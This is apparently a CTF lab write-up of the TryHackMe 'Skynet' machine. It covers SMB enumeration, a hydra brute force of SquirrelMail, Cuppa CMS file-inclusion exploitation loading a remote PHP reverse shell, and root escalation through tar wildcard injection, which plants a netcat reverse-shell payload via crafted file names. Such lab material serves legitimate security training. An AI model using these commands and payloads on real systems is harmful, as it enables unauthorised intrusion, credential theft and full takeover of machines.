---
title: THM - Skynet
tags: [thm, smb, cuppa cms, wildcard injection]
---

<div style="text-align:center;">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/78628bbf76bf1992a8420cdb43e59f2d.jpeg" alt="Challenge logo" style="height:150px;">
</div>

## Deploy and compromise the vulnerable machine!

Start the machine and scan it to find how many ports are open

```
$ nmap -sC -sV 10.10.32.183

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (EdDSA)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES UIDL CAPA PIPELINING SASL TOP AUTH-RESP-CODE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 more LOGIN-REFERRALS have post-login LITERAL+ SASL-IR listed IMAP4rev1 capabilities Pre-login OK ENABLE IDLE ID
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:CB:09:DC:D7:37 (Unknown)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-09-22T01:57:53-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-22 07:57:53
|_  start_date: 1600-12-31 23:58:45
```

Let's continue the enumeration phase on samba. Enumerate all shared resources on samba

```
$ enumlinux -S -U 10.10.32.183

 ============================= 
|    Users on 10.10.32.183    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 

user:[milesdyson] rid:[0x3e8]

 ========================================= 
|    Share Enumeration on 10.10.32.183    |
 ========================================= 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
```

We are able to find the username `milesdyson` and some shared resources. The `anonymous` one looks promising. Let's investigate it

```
$ smbclient //10.10.32.183/anonymous

WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019
```

Let's download `attention.txt` and all the files inside the `logs` directory

```
smb: \> get attention.txt
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 05:42:16 2019
  ..                                  D        0  Thu Nov 26 16:04:00 2020
  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
  log3.txt                            N        0  Wed Sep 18 05:42:16 2019
smb: \logs\> get log1.txt
smb: \logs\> quit
```

We will download only `log1.txt` since the other ones are empty. Let's see the content of the files

```
$ cat attention.txt

A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

Ok, we know that users have recently changes their passwords. Nothing really interesting. Let's read the other file

```
$ cat log1.txt

cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

Looks like a passwords list. This is could be very precious since we could try to bruteforce any login form with these credentials.

Let's visit the web server

![](/assets/img/skynet-web-service.PNG)

Nothing notable. Let's try to bruteforce all subdirectories

```
$ gobuster dir -u http://10.10.32.183/ -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt

/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
/server-status (Status: 403)
```

`/squirrelmail` looks pretty appealing. Let's visit it

![](/assets/img/skynet-squirrelmail.PNG) 

We don't know any credential so we can try to guess them with the information we retrieved until now.

```
$ hydra 10.10.32.183 http-form-post "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." -l milesdyson -P log1.txt

[80][http-post-form] host: 10.10.32.183   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid passwords found
```

We found that `milesdyson`'s password is `cyborg007haloterminator`. Let's log inside the application

![](/assets/img/skynet-squirrelmail-inbox.PNG) 

Start with the first mail. 

![](/assets/img/skynet-email-smb-password.PNG) 

Inside the comunication we are able to find `milesdyson`'s samba password. We can log into his shared folder

```
$ smbclient //10.10.32.183/milesdyson -U milesdyson

smb: \> ls
  .                                                             D        0  Tue Sep 17 10:05:47 2019
  ..                                                            D        0  Wed Sep 18 04:51:03 2019
  Improving Deep Neural Networks.pdf                            N  5743095  Tue Sep 17 10:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
  Convolutional Neural Networks-CNN.pdf                         N 19655446  Tue Sep 17 10:05:14 2019
  notes                                                         D        0  Tue Sep 17 10:18:40 2019
  Neural Networks and Deep Learning.pdf                         N  4304586  Tue Sep 17 10:05:14 2019
  Structuring your Machine Learning Project.pdf                 N  3531427  Tue Sep 17 10:05:14 2019
```
Jump into `notes` directory.
```
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 10:18:40 2019
  ..                                  D        0  Tue Sep 17 10:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 10:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 10:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 10:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 10:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:29 2019
  important.txt                       N      117  Tue Sep 17 10:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 10:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 10:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 10:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 10:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 10:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 10:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 10:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 10:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 10:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 10:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 10:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 10:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 10:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 10:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 10:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 10:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 10:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 10:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 10:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 10:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 10:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 10:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 10:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 10:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 10:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 10:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 10:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 10:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 10:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 10:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 10:01:29 2019
```

Download `important.txt` and read its content

```
smb: \notes\> get important.txt
smb: \notes\> quit
$ cat important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

Seems like we can visit some "beta CMS" at `/45kra24zxs28v3yd` directory. Let's visit it

![](/assets/img/skynet-miles-dyson-page.PNG) 

Nothing interesting on the front page. Bruteforce all subdirectories

```
gobuster dir -u http://10.10.32.183/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/administrator (Status: 301)
```

Let's visit the administration subdirectory

![](/assets/img/skynet-cuppa-cms.PNG) 

We get Cuppa CMS login page. I tried default credentials and Miles Dyson's ones but without any success. I searched online for some known vulnerabilities and I found some Local File Inclusion/Remote File Inclusion (LFI/RFI) on `alerts/alertConfigField.php` page

- [https://www.exploit-db.com/exploits/25971](https://www.exploit-db.com/exploits/25971)  

We can try to confirm the vulnerability with this request

```
http://10.10.32.183/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

![](/assets/img/skynet-etc-passwd.PNG) 

Content prettified

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:113:121::/var/spool/postfix:/bin/false
mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false 
```

With this we can find that `milesdyson` is a user inside this machine. We can exploit the LFI vulnerability to read the user flag inside milesdyson's home directory

```
http://10.10.32.183/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt

7ce5c2109a40f95809928360[redacted] 
```

We can now exploit the RFI vulnerability to get a reverse shell inside the machine and execute it. Download the [PentestMonkey PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)  and modify it as usual. Set up a netcat listener

```
$ nc -lnvp 4242

Listening on [0.0.0.0] (family 0, port 4242)
```

and a simple HTTP python3 server

```
$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Send this request and get a connection

```
http://10.10.32.183/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.220.153:8000/php-reverse-shell.php
```

Let's stabilize our shell

```
$ whoami
www-data
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@skynet:/$ ^Z
[1]+  Stopped                 nc -lnvp 4242
$ stty raw -echo

www-data@skynet:/$ export TERM=xterm
www-data@skynet:/$ 
```

We can see that this machine has multiple cronjob running

```
www-data@skynet:/$ cat /etc/crontab

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

We can see that the script `backup.sh` is running every minute. Let's see its content

```
www-data@skynet:/$ cat /home/milesdyson/backups/backup.sh

#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Believe it or not, we can exploit the use of wildcards in Linux. This technique is described in great details [here](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/). Let's create a msfvenom reverse shell 

```
$ msfvenom -p cmd/unix/reverse_netcat lhost=10.10.220.153 lport=1234 

[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 103 bytes
mkfifo /tmp/jarpkiv; nc 10.10.220.153 1234 0</tmp/jarpkiv | /bin/sh >/tmp/jarpkiv 2>&1; rm /tmp/jarpkiv
```

Set up a netcat listener on port 1234

```
$ nc -lnvp 1234

Listening on [0.0.0.0] (family 0, port 4242)
```

Let's type this command on the compromised machine and wait 

```
echo "mkfifo /tmp/jarpkiv; nc 10.10.220.153 1234 0</tmp/jarpkiv | /bin/sh >/tmp/jarpkiv 2>&1; rm /tmp/jarpkiv" > shell.sh touch "/var/www/html/--checkpoint-action=exec=sh shell.sh" touch "/var/www/html/--checkpoint=1"
```

Netcat should receive a connection back

```
$ nc -lnvp 1234

Listening on [0.0.0.0] (family 0, port 4242)
Connection from 10.10.32.183 48312 received!
whoami
root
cat /root/root.txt
3f0372db24753accc7179a28[redacted] 
```